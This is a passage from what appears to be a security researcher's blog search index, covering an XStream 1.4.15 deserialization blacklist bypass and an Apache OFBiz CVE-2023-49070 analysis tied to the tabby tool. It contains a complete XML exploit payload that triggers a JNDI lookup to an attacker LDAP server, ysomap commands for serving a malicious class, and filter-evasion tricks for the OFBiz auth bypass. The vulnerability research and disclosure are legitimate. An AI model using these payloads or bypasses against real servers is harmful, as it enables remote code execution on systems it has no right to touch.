\u603b\u7ed3","text":"<p>\u672c\u6587\u8bb2\u8ff0\u4e86\u6211\u662f\u5982\u4f55\u901a\u8fc7 tabby \u6765\u6361\u6f0f\u5229\u7528\u94fe\u7684\uff0c\u8fd9\u91cc\u6b22\u8fce\u5e08\u5085\u4eec\u7ed9 tabby \u63d0 pr \u6216 issue\u3002</p> <p>\u53e6\u5916\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u4ef6\u8da3\u4e8b\uff0c\u7531\u4e8e\u56fd\u5185\u8fc7\u4e8e\u79ef\u6781\u63d0\u4ea4\u5229\u7528\u94fe\uff0cXStream \u5b98\u65b9\u65e0\u5948\u4e4b\u4e0b\u9ed8\u8ba4\u5f00\u542f\u767d\u540d\u5355\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u540e\u7eed\u53ef\u80fd\u7684\u7ed5\u8fc7\u3002\u55ef\uff0c\u624b\u52a8\u72d7\u5934\u3002</p> <p></p>","tags":["Java"]},{"location":"blog/2021/xstream_blacklist_bypass/","title":"XStream 1.4.15 Blacklist Bypass","text":"","tags":["Java"]},{"location":"blog/2021/xstream_blacklist_bypass/#1-gadget-overview","title":"#1 Gadget Overview","text":"<p>Recently, I found a new deserialzation gadget which can bypass the latest version of XStream. This gadget use the JDK to construct the gadget chain. I had tested the gadget chain to RCE (remote code execute) with the version of JDK8 (8u162). I think other version of JDK also could trigger this vulnerablity to the RCE.</p> <p>Let's look at this gadget, and the detail is in part #3. </p> <pre><code>TreeSet.putAll\njavax.naming.ldap.Rdn$RdnEntry.compareTo\n    com.sun.org.apache.xpath.internal.objects.XString.equal\n        javax.swing.MultiUIDefaults.toString\n            UIDefaults.get\n                UIDefaults.getFromHashTable\n                    UIDefaults$LazyValue.createValue\n                    SwingLazyValue.createValue\n                        javax.naming.InitialContext.doLookup()\n</code></pre>","tags":["Java"]},{"location":"blog/2021/xstream_blacklist_bypass/#2-poc","title":"#2 Poc","text":"<pre><code>&lt;sorted-set&gt;\n  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n    &lt;type&gt;ysomap&lt;/type&gt;\n    &lt;value class=\"javax.swing.MultiUIDefaults\" serialization=\"custom\"&gt;\n      &lt;unserializable-parents/&gt;\n      &lt;hashtable&gt;\n        &lt;default&gt;\n          &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;\n          &lt;threshold&gt;525&lt;/threshold&gt;\n        &lt;/default&gt;\n        &lt;int&gt;700&lt;/int&gt;\n        &lt;int&gt;0&lt;/int&gt;\n      &lt;/hashtable&gt;\n      &lt;javax.swing.UIDefaults&gt;\n        &lt;default&gt;\n          &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;\n          &lt;resourceCache/&gt;\n        &lt;/default&gt;\n      &lt;/javax.swing.UIDefaults&gt;\n      &lt;javax.swing.MultiUIDefaults&gt;\n        &lt;default&gt;\n          &lt;tables&gt;\n            &lt;javax.swing.UIDefaults serialization=\"custom\"&gt;\n              &lt;unserializable-parents/&gt;\n              &lt;hashtable&gt;\n                &lt;default&gt;\n                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;\n                  &lt;threshold&gt;525&lt;/threshold&gt;\n                &lt;/default&gt;\n                &lt;int&gt;700&lt;/int&gt;\n                &lt;int&gt;1&lt;/int&gt;\n                &lt;string&gt;lazyValue&lt;/string&gt;\n                &lt;sun.swing.SwingLazyValue&gt;\n                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;\n                  &lt;methodName&gt;doLookup&lt;/methodName&gt;\n                  &lt;args&gt;\n                    &lt;string&gt;ldap://localhost:1099/EvilObj&lt;/string&gt;\n                  &lt;/args&gt;\n                &lt;/sun.swing.SwingLazyValue&gt;\n              &lt;/hashtable&gt;\n              &lt;javax.swing.UIDefaults&gt;\n                &lt;default&gt;\n                  &lt;defaultLocale reference=\"../../../../../../../javax.swing.UIDefaults/default/defaultLocale\"/&gt;\n                  &lt;resourceCache/&gt;\n                &lt;/default&gt;\n              &lt;/javax.swing.UIDefaults&gt;\n            &lt;/javax.swing.UIDefaults&gt;\n          &lt;/tables&gt;\n        &lt;/default&gt;\n      &lt;/javax.swing.MultiUIDefaults&gt;\n    &lt;/value&gt;\n  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n    &lt;type&gt;ysomap&lt;/type&gt;\n    &lt;value class=\"com.sun.org.apache.xpath.internal.objects.XString\"&gt;\n      &lt;m__obj class=\"string\"&gt;test&lt;/m__obj&gt;\n    &lt;/value&gt;\n  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&lt;/sorted-set&gt;\n</code></pre> <p>when you try to reproduce this vulnerablity, you should change the line 37's content. For example, changing the <code>ldap://localhost:1099/EvilObj</code> to <code>ldap://your-evil-ldap-server:port/Namespace</code></p>","tags":["Java"]},{"location":"blog/2021/xstream_blacklist_bypass/#3-analysis","title":"#3 Analysis","text":"<p>First of all, XStream can deserialize a tag with <code>&lt;sorted-set&gt;</code> using the TreeSet/TreeMapConverter. And the recover process will call some object's <code>compareTo</code> function and not in the default blacklist.</p> <p>So I try to find a Object with <code>compareTo</code> function. Using <code>javax.naming.ldap.Rdn$RdnEntry.compareTo()</code></p> <pre><code>public int compareTo(RdnEntry that) {\n    int diff = type.compareToIgnoreCase(that.type);\n    if (diff != 0) {\n      return diff;\n    }\n    if (value.equals(that.value)) {     // try shortcut\n      return 0;\n    }\n    return getValueComparable().compareTo(\n      that.getValueComparable());\n}\n</code></pre> <p>The field <code>value</code> is a <code>Object</code> type, so we can use any type of class to transfer the chain.</p> <p>Using <code>com.sun.org.apache.xpath.internal.objects.XString.equal()</code></p> <pre><code>public boolean equals(Object obj2)\n{\n\n  if (null == obj2)\n    return false;\n\n    // In order to handle the 'all' semantics of\n    // nodeset comparisons, we always call the\n    // nodeset function.\n  else if (obj2 instanceof XNodeSet)\n    return obj2.equals(this);\n  else if(obj2 instanceof XNumber)\n      return obj2.equals(this);\n  else\n    return str().equals(obj2.toString());\n}\n</code></pre> <p>The line 15 call the <code>obj2.toString</code> function, and not check the <code>obj2</code>'s type. So we can find a anytype class with <code>toString</code> function.</p> <p>Using <code>javax.swing.MultiUIDefaults.toString()</code></p> <pre><code>public synchronized String toString() {\n    StringBuffer buf = new StringBuffer();\n    buf.append(\"{\");\n    Enumeration keys = keys();\n    while (keys.hasMoreElements()) {\n        Object key = keys.nextElement();\n        buf.append(key + \"=\" + get(key) + \", \");\n    }\n    int length = buf.length();\n    if (length &gt; 1) {\n        buf.delete(length-2, length);\n    }\n    buf.append(\"}\");\n    return buf.toString();\n}\n</code></pre> <p>The line 7 trigger the <code>get</code> function.</p> <pre><code>public Object get(Object key)\n{\n    Object value = super.get(key);\n    if (value != null) {\n        return value;\n    }\n\n    for (UIDefaults table : tables) {\n        value = (table != null) ? table.get(key) : null;\n        if (value != null) {\n            return value;\n        }\n    }\n    return null;\n}\n</code></pre> <p>And on <code>get</code>function, the line 9 call the <code>javax.swing.UIDefaults.get()</code></p> <pre><code>public Object get(Object key) {\n    Object value = getFromHashtable( key );\n    return (value != null) ? value : getFromResourceBundle(key, null);\n}\n</code></pre> <p>Next, the line 2 trigger the <code>getFromHashtable</code> function.</p> <pre><code>private Object getFromHashtable(final Object key) {\n\n        // ...\n    synchronized(this) {\n        value = super.get(key);\n        // ...\n      if (value instanceof LazyValue) {\n            try {\n                /* If an exception is thrown we'll just put the LazyValue\n                 * back in the table.\n                 */\n                value = ((LazyValue)value).createValue(this);\n            }\n</code></pre> <p>When <code>value</code> is <code>LazyValue</code> type, trigger the <code>javax.swing.UIDefaults$LazyValue.createValue()</code>.</p> <p>Next, I found a implementation of <code>LazyValue</code> which can call any static method using reflection.</p> <p>Using <code>sun.swing.SwingLazyValue.createValue()</code></p> <pre><code>public Object createValue(final UIDefaults table) {\n    try {\n        ReflectUtil.checkPackageAccess(className);\n        Class&lt;?&gt; c = Class.forName(className, true, null);\n        if (methodName != null) {\n            Class[] types = getClassArray(args);\n            Method m = c.getMethod(methodName, types);\n            makeAccessible(m);\n            return m.invoke(c, args);\n        } else {\n            Class[] types = getClassArray(args);\n            Constructor constructor = c.getConstructor(types);\n            makeAccessible(constructor);\n            return constructor.newInstance(args);\n        }\n    } catch (Exception e) {\n        // Ideally we would throw an exception, unfortunately\n        // often times there are errors as an initial look and\n        // feel is loaded before one can be switched. Perhaps a\n        // flag should be added for debugging, so that if true\n        // the exception would be thrown.\n    }\n    return null;\n}\n</code></pre> <p>The line 4 to 9 will call a class's static method, so we should find a static method which can do something evil.</p> <p>I found the <code>javax.naming.InitialContext.doLookup()</code> method is a good choice.</p> <pre><code>public static &lt;T&gt; T doLookup(String name)\n    throws NamingException {\n    return (T) (new InitialContext()).lookup(name);\n}\n</code></pre> <p>This method could launch a JNDI connection. So we can set up a evil LDAP/RMI server to execute arbitrary code we wanted.</p> <p>For example, using my tool <code>ysomap</code> to set up a LDAP server and evil http server</p> <pre><code>// set up a evil http server\nuse exploit SimpleHTTPServer\nuse payload EvilFileWrapper\nuse bullet ClassWithEvilConstructor\nset lport 8088\nset path /EvilObj.class\nset classname EvilObj\nset body \"open -a Calculator\"\nset type class\nrun\n// set up a evil LDAP server\nuse exploit LDAPRefListener\nset lport 1099\nset codebase http://localhost:8088/\nset objectName EvilObj\nrun\n</code></pre> <p></p> <p>Then, try to deserialze the payload, you will get a calculator XD</p> <p></p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/","title":"\u3010tabby \u6848\u4f8b\u968f\u7b14\u3011XML-RPC RCE CVE-2023-49070","text":"","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/#1","title":"#1 \u524d\u8a00","text":"<p>\u8fd9\u51e0\u5929\uff0cofbiz \u51fa\u4e86\u4e00\u4e2a\u8ba4\u8bc1\u7ed5\u8fc7\u5bfc\u81f4\u7684 xml-rpc \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u5728\u590d\u73b0\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u7528 tabby \u8dd1\u5b9e\u9645\u7684\u6f0f\u6d1e\u94fe\u8def\u4f1a\u975e\u5e38\u957f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u5b8c\u6210\u5229\u7528\u94fe\u7684\u68c0\u7d22\u3002</p> <p>\u672c\u6587\u5c06\u8ba8\u8bba tabby \u7684\u53e6\u4e00\u79cd\u89c4\u5219\u6269\u5c55\u65b9\u6cd5\uff0c\u4f7f\u5f97\u5728\u4e2a\u4eba\u673a\u5668\u4e0a\u9047\u5230\u51fd\u6570\u8c03\u7528\u94fe\u8def\u8fc7\u6df1\u7684\u60c5\u51b5\u4e5f\u53ef\u4ee5\u67e5\u8be2\u51fa\u5bf9\u5e94\u7684\u6f0f\u6d1e\u94fe\u8def\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/#2","title":"#2 \u73af\u5883\u642d\u5efa","text":"<p>\u5f71\u54cd\u7248\u672c\uff1aApache OFBiz &lt; 18.12.10 \u53d7\u5f71\u54cd\u7248\u672c\u4e0b\u8f7d\u5730\u5740\uff1ahttps://archive.apache.org/dist/ofbiz/apache-ofbiz-18.12.09.zip \u4fee\u590d\u7248\u672c\u4e0b\u8f7d\u5730\u5740\uff1ahttps://archive.apache.org/dist/ofbiz/apache-ofbiz-18.12.10.zip</p> <p>\u89e3\u538b\u540e\uff0c\u76f4\u63a5\u7528 dockerfile \u8d77\u4e0d\u6765\uff0c\u5982\u679c\u53ef\u4ee5\u8d77\u6765\u5ffd\u7565\u4e0b\u9762\u7684\u64cd\u4f5c \u6267\u884c\u547d\u4ee4 <code>./gradlew build</code> \u4fee\u6539 dockerfile\uff0c\u6ce8\u91ca\u6389 <code>FROM eclipse-temurin:8 AS runtimebase</code> \u524d\u7684\u8bed\u53e5\uff0c\u4fee\u6539\u89e3\u538b\u7f29 ofbiz.tar \u7684\u64cd\u4f5c\u4e3a\u4e0b\u9762\u7684\u5185\u5bb9\u3002 <pre><code># Extract the OFBiz tar distribution created by the builder stage.\nCOPY ./build/distributions/ofbiz.tar /tmp/ofbiz.tar\nRUN [\"tar\", \"--extract\", \"--strip-components=1\", \"--file=/tmp/ofbiz.tar\"]\n</code></pre> \u7f16\u5199 docker-compose.yaml <pre><code>version: '3'\nservices:\n    ofbiz:\n        build: .\n        ports:\n            - \"8080:8080\"\n            - \"8443:8443\"\n            - \"5005:5005\"\n</code></pre> \u7528 ofbiz.tar \u91cc\u7684 libs \u76ee\u5f55\u751f\u6210\u56fe\u6570\u636e\u5e93</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/#3","title":"#3 \u6f0f\u6d1e\u5206\u6790","text":"<p>ofbiz \u4e4b\u524d\u5728 20 \u5e74\u7684\u65f6\u5019\u51fa\u8fc7 xml-rpc \u7684 rce \u6f0f\u6d1e(CVE-2020-9496)\uff0c\u5f53\u65f6\u662f pre-auth \u7684\uff0c\u540e\u7eed\u5b98\u65b9\u7ed9 xmlrpc \u63a5\u53e3\u52a0\u4e86\u9274\u6743\u64cd\u4f5c\uff0c\u4fee\u590d\u89c1 \u94fe\u63a5  \u800c\u672c\u6b21 CVE-2023-49070 \u63d0\u793a\u7684\u8fd8\u662f pre-auth\uff0c\u90a3\u4e48\u610f\u5473\u7740\u8fd9\u6b21\u6f0f\u6d1e\u5b58\u5728\u6743\u9650\u7ed5\u8fc7\u7684\u95ee\u9898 <code>org.apache.ofbiz.webapp.control.RequestHandler#doRequest</code>  \u5728 doRequest \u51fd\u6570\u4e2d\uff0c\u5904\u7406\u5f53\u524d url \u7684 event \u4e4b\u524d\uff0c\u4f1a\u6839\u636e\u5f53\u524d requestMap \u662f\u5426\u8bbe\u7f6e security auth \u4e3a true \u6765\u51b3\u5b9a\u662f\u5426\u9700\u8981\u8fdb\u884c\u767b\u9646\u786e\u5b9a\u3002\u8c03\u7528\u5230 checkLogin \u6240\u5bf9\u5e94\u7684 event \u540e\uff0c\u8fd4\u56de\u7684 <code>checkLoginReturnString</code> \u5982\u679c\u4e3a success \u65f6\uff0c\u6b64\u5904\u7684 eventReturn \u5c06\u4ecd\u4fdd\u6301\u4e3a null\u3002\u5728\u540e\u7eed\u6267\u884c\u5bf9\u5e94\u7684 event \u524d\uff0c\u4f1a\u6709\u5982\u4e0b\u5224\u65ad  \u4ec5\u5f53 eventReturn \u4e3a null \u624d\u80fd\u8fdb\u5165\u540e\u7eed\u7684 event \u8c03\u7528\u6d41\u7a0b\u3002 \u800c\u6b63\u5e38\u672a\u767b\u9646\u7684\u60c5\u51b5\u4e0b\uff0ccheckLogin \u8fd4\u56de\u7684\u4e3a error\uff0c\u540e\u7eed\u7684 <code>eventReturn</code> \u4f1a\u88ab\u8d4b\u503c\u4e3a error\uff0c\u56e0\u6b64\u8fdb\u5165\u4e0d\u4e86\u540e\u7eed\u7684 event \u6267\u884c\u6d41\u7a0b\u3002 \u90a3\u4e48\uff0c\u5f88\u660e\u663e checkLogin \u6240\u5bf9\u5e94\u7684\u51fd\u6570\u6267\u884c\u5b58\u5728\u9274\u6743\u4e0a\u7684\u95ee\u9898\u3002 <code>org.apache.ofbiz.webapp.control.LoginWorker#extensionCheckLogin</code> <code>org.apache.ofbiz.webapp.control.LoginWorker#checkLogin</code> <code>org.apache.ofbiz.webapp.control.LoginWorker#login</code>  \u51fd\u6570 login \u91cc\u9762\u6709\u8fd9\u6837\u4e00\u4e2a\u903b\u8f91\uff0c\u5f53\u53c2\u6570\u4e2d\u5305\u542b <code>requirePasswordChange</code> \u4e14\u4e3a <code>Y</code> \u65f6\uff08unpwWErrMsgList \u53ef\u4ee5\u63a7\u5236 username \u548c password \u4e3a\u7a7a\u6765\u63d2\u5165\u503c\uff09\uff0c\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u4e3a <code>requirePasswordChange</code> \u800c\u975e <code>error</code> \u90a3\u4e48\u5728 checkLogin \u51fd\u6570\u5904\u8fdb\u5165\u4e0d\u6765 345 \u5904\u7684 if \u5206\u652f\uff0c\u4e5f\u5c31\u6700\u7ec8\u8fd4\u56de\u4e0d\u4e86 error \u5b57\u7b26\u4e32\uff0c\u800c\u8fd4\u56de success\uff0c\u6700\u7ec8\u7ed5\u8fc7 securit auth \u7684\u8ba4\u8bc1\u3002</p> <p>\u90a3\u4e48\uff0c\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u8ddf\u4e4b\u524d CVE-2020-9496 \u662f\u4e00\u6837\u7684\uff0c\u6784\u9020\u597d xml-rpc \u7684\u53cd\u5e8f\u5217\u5316 payload \u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u5373\u53ef\u3002</p> <p>\u53e6\u5916\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e0b<code>org.apache.ofbiz.base.util.CacheFilter#doFilter</code> \u68c0\u67e5\u4e86xml-rpc  \u7ed5\u8fc7\u65b9\u6cd5\u6bd4\u8f83\u7b80\u5355<code>&lt;/serializable</code> \u6539\u6210 <code>&lt; /serializable</code>  \u6216\u8005 url \u6539\u6210 <code>/webtools/control/xmlrpc;?xxx</code> \u6216\u8005 <code>/webtools/control/xmlrpc//</code></p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/#4","title":"#4 \u6f0f\u6d1e\u4fee\u590d","text":"<p>\u5b98\u65b9\u5c06 xmlrpc \u63a5\u53e3\u548c xml-rpc \u76f8\u5173\u4f9d\u8d56\u90fd\u5220\u9664\u4e86\uff0c\u4fee\u590d\u7684\u5f88\u66b4\u529b https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27#diff-15bd438825c15daa959003c7ff3a5d7dc30c34e86e1cb5f7102be19464ebccb8 \u4f46\u662f\uff0c\u5f88\u5947\u602a\u7684\u662f\u8fd9\u91cc\u7684\u8ba4\u8bc1\u7ed5\u8fc7\u8c8c\u4f3c\u5e76\u6ca1\u6709\u4fee\u590d https://github.com/apache/ofbiz-framework/blob/c59336f604f503df5b2f7c424fd5e392d5923a27/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/LoginWorker.java#L444  \u90a3\u4e48\u662f\u4e0d\u662f\u5728 webtools \u6216\u5176\u4ed6\u57df\u4e0b\u6ce8\u518c\u7684 event \u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\uff1f\u6216\u8bb8\u5176\u4ed6 event \u6240\u5bf9\u5e94\u7684\u51fd\u6570\u8c03\u7528\u5728\u6ca1\u6709\u505a\u9274\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u4ea7\u751f\u5b89\u5168\u95ee\u9898\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/#5-tabby","title":"#5 \u56de\u5230tabby\u89c4\u5219\u4f18\u5316\u4e0a","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u4e3b\u8981\u6709\u4e24\u4e2a\u90e8\u5206\uff1a\u9274\u6743\u7ed5\u8fc7\u548c xml-rpc \u53cd\u5e8f\u5217\u5316\u3002 \u7531\u4e8e tabby \u5e76\u6ca1\u6709\u5904\u7406\u5b57\u7b26\u4e32\u6bd4\u8f83\u7684\u5206\u6790\uff0c\u8fd8\u6ca1\u529e\u6cd5\u505a\u6b64\u7c7b\u95ee\u9898\u7684\u68c0\u6d4b\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u786e\u5b9e\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u540e\u7eed\u7684\u65b9\u5411\u3002 \u7b2c\u4e8c\u90e8\u5206 xml-rpc \u53cd\u5e8f\u5217\u5316\uff0c\u539f\u7406\u8fd9\u7bc7\u6587\u7ae0\u5c06\u7684\u5f88\u6e05\u695a\u4e86\uff0c\u4e0d\u8fc7\u591a\u8d58\u8ff0\u3002 \u5728\u5b9e\u9645\u67e5\u627e\u6574\u4e00\u6761\u94fe\u8def\u7684\u65f6\u5019\uff0c\u4f1a\u53d1\u73b0\u6df1\u5ea6\u8fc7\u6df1\uff0c\u67e5\u627e\u65f6\u95f4\u4f1a\u5f88\u957f\u3002\u8fd9\u91cc\u5c1d\u8bd5\u5206\u5f00\u6765\u67e5\u627e\u5bf9\u5e94\u7684\u8def\u5f84\u3002 \u9996\u5148\u662fxml-rpc\u8fd9\u8fb9\u7684\u94fe\u8def\uff0c\u8282\u70b9\u65708 <pre><code>match (source:Method {NAME0:\"org.apache.xmlrpc.parser.XmlRpcRequestParser#endElement\"})\nmatch (sink:Method {IS_SINK:true, NAME:\"readObject\", HAS_PARAMETERS:false})\ncall tabby.algo.findPath(source, \"-\", sink, 10, true) yield path where none(n in nodes(path) where n.NAME0 in [\"java.util.Iterator#hasNext\",\"java.lang.Runnable#run\",\"java.util.Enumeration#nextElement\"])\nreturn path skip 2 limit 1\n</code></pre>  \u8fd9\u91cc\u6ca1\u6709\u95ee\u9898\uff0c\u518d\u5c1d\u8bd5\u627e\u4e00\u4e0bofbiz\u4e0a\u7684\u94fe\u8def\uff0c\u8fd9\u91cc\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u6211\u4eec\u76f4\u63a5\u4ee5<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler</code>\u4f5c\u4e3asource\uff0csink\u662f\u4e0a\u4e00\u6761\u7684\u5f00\u59cb <pre><code>match (source:Method {NAME0:\"org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke\"})\nmatch (sink:Method {NAME0:\"org.apache.xerces.parsers.AbstractSAXParser#endElement\"})\ncall tabby.algo.findPathWithState(source, \"-\", sink, \"[[-1]]\", 18, true) yield path where none(n in nodes(path) where n.NAME0 in [\"java.util.Iterator#hasNext\",\"java.util.Iterator#next\",\"java.lang.Runnable#run\",\"java.util.Enumeration#nextElement\",\"java.io.Writer#write\",\"org.apache.xmlrpc.server.XmlRpcStreamServer#writeError\",\"org.apache.xmlrpc.server.XmlRpcStreamServer#writeResponse\",\"nu.xom.xslt.XOMReader#parse\",\"com.sun.xml.fastinfoset.sax.SAXDocumentParser#parse\",\"org.ccil.cowan.tagsoup.Parser#parse\",\"org.apache.xerces.parsers.NonValidatingConfiguration#parse\",\"org.apache.xerces.impl.xs.opti.SchemaParsingConfig#parse\",\"java.io.Closeable#close\",\"org.cyberneko.html.HTMLScanner#scanDocument\"])\nreturn path limit 1\n</code></pre> \u4e00\u517117\u4e2a\u8282\u70b9\uff0c\u82b1\u8d39 73 s  \u4eba\u5de5\u8ba1\u7b97\u4e00\u4e0b\u6c61\u70b9\u60c5\u51b5\uff0c\u4e24\u6761\u5408\u5e76\u540e\u7684\u6c61\u70b9\u662f\u7b26\u5408\u4f20\u9012\u89c4\u5219\u7684\u3002\u4f46\u662f\u4e24\u6761\u5408\u5e76\u540e\u4e00\u517125\u4e2a\u8282\u70b9\uff0c\u67e5\u8be2\u6df1\u5ea6\u9700\u8981\u63d0\u523026\u624d\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u6df1\u5ea6\u67e5\u8be2\u901f\u5ea6\u6709\u70b9\u611f\u4eba\uff0c\u7b49\u4e86\u5f88\u4e45\u90fd\u6ca1\u6709\u51fa\u6765\u3002 \u8fd9\u79cd\u60c5\u51b5\u4e5f\u662f tabby \u8fd9\u5957\u65b9\u6848\u7684\u4e00\u4e2a\u74f6\u9888\u3002\u867d\u7136\u56fe\u4e0a\u5b8c\u6574\u5efa\u7acb\u4e86\u8c03\u7528\u94fe\u8def\uff0c\u4f46\u662f\u7531\u4e8eneo4j\u6027\u80fd\u9650\u5236\uff0c\u5bf9\u4e8e\u8fc7\u6df1\u7684\u6df1\u5ea6\u8def\u5f84\u67e5\u8be2\u9700\u8981\u82b1\u8d39\u5f88\u957f\u65f6\u95f4\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u5b9e\u9645\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u786e\u5b9e\u4f1a\u9047\u5230\u7c7b\u4f3c\u7684\u95ee\u9898\uff0c\u600e\u4e48\u53bb\u8865\u6551\u8fd9\u79cd\u60c5\u51b5\u5462\uff1f \u5176\u5b9etabby\u9884\u7559\u4e86\u4eba\u5de5\u5efa\u8fb9\u7684\u80fd\u529b https://github.com/wh1t3p1g/tabby/tree/master/src/main/java/tabby/core/model model\u4e0b\u9762\u7684\u7c7b\u5c06\u5904\u7406\u56fe\u5efa\u8fb9\u7684\u8fc7\u7a0b\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u7ed9 xml-rpc \u505a\u4e00\u4e2a\u7279\u4f8b\u3002 \u8fd9\u91cc\u6211\u4eec\u5c06 xml-rpc \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u4f5c\u4e3a\u5148\u9a8c\u77e5\u8bc6  \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u9700\u89813\u6b65\uff1a 1. \u521d\u59cb\u5316 XmlRpcRequestParser 2. \u8bbe\u7f6e\u4e3axmlreader\u7684ContentHandler 3. \u6700\u540e\uff0cparse\u7684input source\u662f\u53ef\u63a7\u7684 \u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u8fd9\u4e2axml-rpc\u7684\u6f0f\u6d1e\u8fdb\u884c\u5efa\u6a21\u3002 \u672c\u7740\u5b81\u53ef\u9519\u6740\u4e0d\u53ef\u9057\u6f0f\u7684\u539f\u5219\uff08\u4e00\u822cinput source\u5f88\u96be\u53bb\u63a8\u65ad\u662f\u5426\u53ef\u63a7\uff0c\u7c7b\u4f3c\u5b58\u5728\u8bfb\u5165xml\u6587\u4ef6\u4f46\u6587\u4ef6\u53ef\u63a7\u7684\u60c5\u51b5\uff0c\u5728\u9759\u6001\u5206\u6790\u4e0a\u5f88\u96be\u505a\u5224\u65ad\u662f\u5426\u53ef\u63a7\uff09\uff0c\u6211\u4eec\u53d6\u524d\u4e24\u4e2a\u4e3asink\u8c03\u7528\u70b9\u7684\u8bc6\u522b \u4e5f\u5c31\u662f\u5f53XMLReader.setContentHandler\u8bbe\u7f6e\u7684\u662fXmlRpcRequestParser\u7c7b\u578b\u65f6\uff0c\u53ef\u80fd\u5b58\u5728xml-rpc\u8fd9\u4e2a\u6f0f\u6d1e\u3002  \u8fd9\u91cc\u7684\u903b\u8f91\u662f\u5f53XMLReader.setContentHandler\u7684\u53c2\u6570\u7c7b\u578b\u662f\u4e0b\u9762\u4e24\u79cd\u7c7b\u578b\u4e4b\u4e00\u65f6\uff0c\u5efa\u7acb\u4e00\u4e2a\u6307\u5411\u53cd\u5e8f\u5217\u5316readObject\u51fd\u6570\u7684\u4eba\u5de5\u8fb9 1. org.apache.xmlrpc.parser.XmlRpcRequestParser 2. org.apache.xmlrpc.parser.XmlRpcResponseParser \u901a\u8fc7\u8fd9\u4e2a\u65b9\u5f0f\uff0c\u6211\u4eec\u91cd\u65b0\u8dd1\u4e00\u4e0b\u67e5\u8be2\u540e\u5f97\u5230\u4e00\u6761\u6df1\u5ea6\u4e3a4\u7684\u8c03\u7528\u8def\u5f84\u3002  \u8fd9\u79cd\u6df1\u5ea610\u4ee5\u4e0b\u7684\u94fe\u8def\u5bf9\u4e8e\u4e2a\u4eba\u673a\u5668\u8fd8\u662f\u5f88\u53cb\u597d\u7684 XD</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/","title":"\u3010tabby \u6848\u4f8b\u968f\u7b14\u3011sysaid CVE-2023-47246","text":"","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/#_1","title":"\u524d\u8a00","text":"<p>\u6700\u8fd1\u5f00\u59cb\u8fd0\u8425 tabby \u7684\u76f8\u5173\u89c4\u5219\u5e93\uff0c\u540e\u7eed\u4f1a\u6709\u4e00\u4e9b\u7c7b\u4f3c\u7684\u4f7f\u7528 tabby \u5206\u6790\u6f0f\u6d1e\u7684\u968f\u7b14\u3002</p> <p>\u5728 11 \u6708\u521d\uff0c\u5fae\u8f6f\u5b89\u5168\u56e2\u961f\u62ab\u9732\u4e86 Lace Tempest \u9ed1\u5ba2\u56e2\u961f\u5229\u7528 SysAid \u8f6f\u4ef6\u7684 0day \u6f0f\u6d1e (CVE-2023-47246)\u8fdb\u884c\u52d2\u7d22\u8f6f\u4ef6\u5206\u53d1\u7684\u5b89\u5168\u4e8b\u4ef6\u3002\u540e\u7eed\uff0cgithub \u4e0a\u4e5f\u51fa\u73b0\u4e86\u8be5\u6f0f\u6d1e\u7684 exp\u3002\u672c\u6587\u4e3b\u8981\u4ee5\u8be5\u6f0f\u6d1e\u4e3a\u4f8b\u6765\u8bb2\u8ff0\u9762\u5bf9\u6df7\u6dc6\u5546\u4e1a\u4ee3\u7801\u573a\u666f\u4e0b tabby 